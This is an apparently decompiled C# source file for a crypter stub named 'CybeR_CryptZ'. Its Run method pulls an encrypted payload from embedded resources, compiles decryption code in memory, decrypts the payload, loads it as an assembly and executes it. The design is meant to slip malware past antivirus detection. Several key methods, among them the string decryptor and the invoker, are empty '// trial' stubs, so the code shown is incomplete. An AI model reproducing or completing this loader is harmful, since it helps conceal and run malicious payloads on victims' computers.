using System.CodeDom.Compiler;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace CybeR_CryptZ
{

    [StandardModule]
    internal sealed class Main__CRz
    {

        public static Assembly Dynamic_Compiler(string Source_As_String)
        {
            CompilerResults compilerResults = null;
            CompilerParameters compilerParameters = new CompilerParameters();
            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider(Main__CRz.PolyDeCrypt("VisualBasicc"));
            compilerParameters.GenerateExecutable = false;
            compilerParameters.GenerateInMemory = true;
            compilerParameters.ReferencedAssemblies.Add(Main__CRz.PolyDeCrypt("System.dll"));
            compilerParameters.ReferencedAssemblies.Add(Main__CRz.PolyDeCrypt("System.Management.dll"));
            compilerParameters.ReferencedAssemblies.Add(Main__CRz.PolyDeCrypt("System.Data.dll"));
            compilerParameters.ReferencedAssemblies.Add(Main__CRz.PolyDeCrypt("System.Windows.Forms.dll"));
            compilerParameters.CompilerOptions = Main__CRz.PolyDeCrypt("/platform:x86");
            compilerParameters.TreatWarningsAsErrors = false;
            string[] sArr = new string[] { Source_As_String };
            compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, sArr);
            return compilerResults.CompiledAssembly;
        }

        public static void Main()
        {
            // trial
        }

        public static object OwnZ(Assembly TheCompiledFile, string _Class_, string _Method_, object[] Parameters_Object)
        {
            // trial
            return null;
        }

        public static string PolyDeCrypt(string Input)
        {
            // trial
            return null;
        }

        public static void Run()
        {
            ResourceManager resourceManager = new ResourceManager(Main__CRz.PolyDeCrypt("nameofres"), Assembly.GetExecutingAssembly());
            string s = resourceManager.GetString(Main__CRz.PolyDeCrypt("nameofencres")).ToString();
            byte[] bArr = Encoding.Default.GetBytes(resourceManager.GetString(Main__CRz.PolyDeCrypt("nameofres")).ToString());
            object[] objArr1 = new object[] { bArr };
            object obj = RuntimeHelpers.GetObjectValue(Main__CRz.OwnZ(Main__CRz.Dynamic_Compiler(Main__CRz.PolyDeCrypt(s)), Main__CRz.PolyDeCrypt("PolyCrypt"), Main__CRz.PolyDeCrypt("PolyRevDeCrypt"), objArr1));
            objArr1 = new object[] { RuntimeHelpers.GetObjectValue(obj) };
            object[] objArr2 = objArr1;
            bool[] flagArr = new bool[] { true };
            if (flagArr[0])
                obj = RuntimeHelpers.GetObjectValue(objArr2[0]);
            Main__CRz.OwnZ((Assembly)NewLateBinding.LateGet(null, typeof(Assembly), "Load", objArr2, null, null, flagArr), Main__CRz.PolyDeCrypt("This_Main"), Main__CRz.PolyDeCrypt("MainS"), null);
            ProjectData.EndApp();
        }

    } // class Main__CRz

}

